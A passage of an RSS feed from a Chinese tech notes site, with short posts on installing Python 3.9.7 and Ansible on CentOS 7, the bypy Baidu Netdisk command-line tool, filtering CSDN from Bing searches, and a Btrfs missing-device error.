      <guid>https://www.geekery.cn/note-book/Ansible/Centos7.x%E5%AE%89%E8%A3%85Python3.9.7%E5%92%8CAnsible4.5.html</guid>
      <source url="https://www.geekery.cn/rss.xml">CentOS 7.x安装Python3.9.7和Ansible4.5</source>
      <description>CentOS 7.x安装Python3.9.7和Ansible4.5 1、环境信息 前期安装Ansible失败报&amp;quot;Failed to validate the SSL certificate&amp;quot;，可能前期安装python3时有问题，后索性升级SSH/SSL后再重新安装Python3,然后再升级pip,最后再安装Ansible 2、安装步骤 3、问题解决 ...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>1、环境信息</h2>
<p>前期安装Ansible失败报"Failed to validate the SSL certificate"，可能前期安装python3时有问题，后索性升级SSH/SSL后再重新安装Python3,然后再升级pip,最后再安装Ansible</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">安装环境：</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 　CentOS</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 7.9</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">SSH/SSL:　　OpenSSH_8.7p1,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OpenSSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1.1.1l</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Aug</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2021</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#Python版本(3.9.7为此文章第2步安装后的版本信息)：</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># python --version</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Python</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2.7.5</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># python3 --version</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Python</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3.9.7</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>2、安装步骤</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##安装依赖</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gcc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gcc-c++</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ncurses</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ncurses-devel</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> unzip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> zlib-devel</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> zlib</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openssl-devel</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openssl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libffi-devel</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##源码安装Python3.9.7</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /opt</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://www.python.org/ftp/python/3.9.7/Python-3.9.7.tgz</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /opt</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tar</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -zxvf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Python-3.9.7.tgz</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /opt/Python-3.9.7</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">./configure</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --prefix=/usr/local/python/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">make</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">make</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##设置命令环境</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/usr/local/python/bin/python3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --version</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ln</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/python/bin/python3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">python3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --version</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##升级pip</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/usr/local/python/bin/pip3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --upgrade</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pip</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ln</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/python/bin/pip3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##安装最新版本ansible4.5.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pip3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ansible</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/usr/local/python/bin/ansible</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --version</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ln</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/python/bin/ansible</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/bin/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ansible</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --version</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>3、问题解决</h2>
<p>有些文章在安装Python后，会在/usr/bin下把python的软链接指向python3
注意：如果不修改默认python的软链接，无需修改相应yum配置。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ll /usr/bin|grep python</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">       7</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Sep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20:10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> python</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">python3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">       9</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Sep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20:10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> python2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">python2.7</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rwxr-xr-x.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    7144</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Oct</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 14</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  2020</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> python2.7</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rwxr-xr-x.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    7144</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Oct</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 14</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  2020</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> python3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">-&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/usr/local/python/bin/python3.9</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此时yum会无法使用
yum需要用python2编译，如果服务器安装的是python3并作为默认编译器的话，yum会无法使用，修改如下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/bin/yum</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##修改第一行解释器为python2</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#!/usr/bin/python2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">import</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sys</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">try:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    import</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> yum</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">except</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ImportError:</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">    print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt;&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">sys.stderr,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> """</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>还需要修改 /usr/libexec/urlgrabber-ext-down脚本，同样需要python2作为编译器</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/libexec/urlgrabber-ext-down</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">　</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##修改第一行解释器为python2</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#! /usr/bin/python2</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#  A very simple external downloader</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#  Copyright 2011-2012 Zdenek Pavlas</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Linux命令行百度网盘</title>
      <link>https://www.geekery.cn/note-book/BaiduNetDisk/Linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98.html</link>
      <guid>https://www.geekery.cn/note-book/BaiduNetDisk/Linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Linux命令行百度网盘</source>
      <description>Linux命令行百度网盘 bypy 简介 bypy 是一个基于 Python 的命令行工具，用于操作百度网盘（百度云），它为用户提供了丰富的命令行操作接口。bypy 适合在 Linux 服务器环境中使用，能够高效地进行大文件传输，支持多线程操作，具备上传、下载、同步等功能。 安装 bypy 要在 Linux 系统中安装 bypy，可以通过 pip（Py...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>bypy 简介</h2>
<p>bypy 是一个基于 Python 的命令行工具，用于操作百度网盘（百度云），它为用户提供了丰富的命令行操作接口。bypy 适合在 Linux 服务器环境中使用，能够高效地进行大文件传输，支持多线程操作，具备上传、下载、同步等功能。</p>
<h2>安装 bypy</h2>
<p>要在 Linux 系统中安装 bypy，可以通过 pip（Python 包管理器）来实现：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bypy</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>使用 bypy</h2>
<h2>登录配置</h2>
<p>首次使用 bypy 之前，需要先进行配置。运行以下命令开始配置过程：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bypy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>根据提示访问授权页面并获取授权码，然后将授权码输入到终端中完成配置。</p>
<h2>命令</h2>
<p>bypy 提供了多种操作命令，例如：</p>
<p><code>quota</code>: 显示百度云存储配额信息。</p>
<p><code>list</code>: 列出指定目录下的文件列表。</p>
<p><code>upload</code>: 上传本地文件到百度云。</p>
<p><code>download</code>: 从百度云下载文件到本地。</p>
<p><code>syncup</code>: 将本地文件同步到百度云。</p>
<p><code>syncdown</code>: 将百度云文件同步到本地。</p>
<p><code>delete</code>: 删除百度云上的文件。</p>
<p><code>makedir</code>: 在百度云上创建目录。</p>
<p><code>move</code>: 移动百度云上的文件。</p>
<p><code>copy</code>: 复制百度云上的文件。</p>
<p><code>compare</code>: 比较本地和云文件的差异。</p>
<h2>调试</h2>
<p>添加 <code>-v</code> 参数，会显示进度详情。</p>
<p>添加 <code>-d</code>，会显示一些调试信息。</p>
<p>添加 <code>-ddd</code>，显示 HTTP 通讯信息。</p>
<h2>使用示例</h2>
<h2>登录配置示例</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">test</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) [user @ cloud 20:17:08 /mnt/data/]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bypy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> info</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Please</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> visit:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">https://openapi.baidu.com/oauth/2.0/authorize?client_id</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=q8W</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">And</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> authorize</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> this</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Paste</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Authorization</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Code</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> here</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> within</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> minutes.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Press</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [Enter] when you are </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">done</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">c5c3085d143f880df0727d3f</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Authorizing,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> please</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> be</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> patient,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> it</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> may</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> take</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> upto</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 300</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> seconds...</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Quota:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 10.010TB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Used:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1.332TB</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>登录验证后会显示当前剩余存储空间和已用空间。</p>
<h3>主要参数</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bypy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -h</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>此命令会显示所有可用的命令行参数及其描述。</p>
<p><strong>命令行参数解释</strong></p>
<p>| 参数                            | 描述                                                         |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>必应搜索屏蔽垃圾网站</title>
      <link>https://www.geekery.cn/note-book/Bing/%E5%BF%85%E5%BA%94%E6%90%9C%E7%B4%A2%E5%B1%8F%E8%94%BD%E5%9E%83%E5%9C%BE%E7%BD%91%E7%AB%99.html</link>
      <guid>https://www.geekery.cn/note-book/Bing/%E5%BF%85%E5%BA%94%E6%90%9C%E7%B4%A2%E5%B1%8F%E8%94%BD%E5%9E%83%E5%9C%BE%E7%BD%91%E7%AB%99.html</guid>
      <source url="https://www.geekery.cn/rss.xml">必应搜索屏蔽垃圾网站</source>
      <description>必应搜索屏蔽垃圾网站 默认的必应搜索搜索代码相关的信息很多csdn的文章，质量不行，使用 -*.csdn.net过滤掉 屏蔽后 搜索Linux 国内版：https://cn.bing.com/search?q=Linux%20-site:*.csdn.net 国际版： https://bing.com/search?q=Linux%20-site:*....</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>默认的必应搜索搜索代码相关的信息很多csdn的文章，质量不行，使用 -*.csdn.net过滤掉</p>
</blockquote>
<h2>屏蔽后</h2>
<p>搜索Linux</p>
<p>国内版：<a href="https://cn.bing.com/search?q=Linux%20-site:*.csdn.net" target="_blank" rel="noopener noreferrer">https://cn.bing.com/search?q=Linux%20-site:*.csdn.net</a></p>
<p>国际版： <a href="https://bing.com/search?q=Linux%20-site:*.csdn.net" target="_blank" rel="noopener noreferrer">https://bing.com/search?q=Linux%20-site:*.csdn.net</a></p>
<h2>Firefox搜搜引擎配置</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">https://bing.com/search?q</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=%s%20-site:*.csdn.net</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
]]></content:encoded>
    </item>
    <item>
      <title>Brtfs报错Some-devices-missing</title>
      <link>https://www.geekery.cn/note-book/Btrfs/Brtfs%E6%8A%A5%E9%94%99Some-devices-missing.html</link>
      <guid>https://www.geekery.cn/note-book/Btrfs/Brtfs%E6%8A%A5%E9%94%99Some-devices-missing.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Brtfs报错Some-devices-missing</source>
      <description>Brtfs报错Some-devices-missing 问题原因： 因为创建btrfs时使用了-f，所以硬盘被另一个btrfs抢走了，blkid改变 问题描述 问题解决 参考连接 https://btrfs.wiki.kernel.org/index.php/Problem_FAQ#I_can.27t_mount_my_filesystem.2C_an...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>问题原因：</h2>
<p>因为创建btrfs时使用了-f，所以硬盘被另一个btrfs抢走了，blkid改变</p>
<h2>问题描述</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> show</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">warning,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> device</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> missing</span></span>
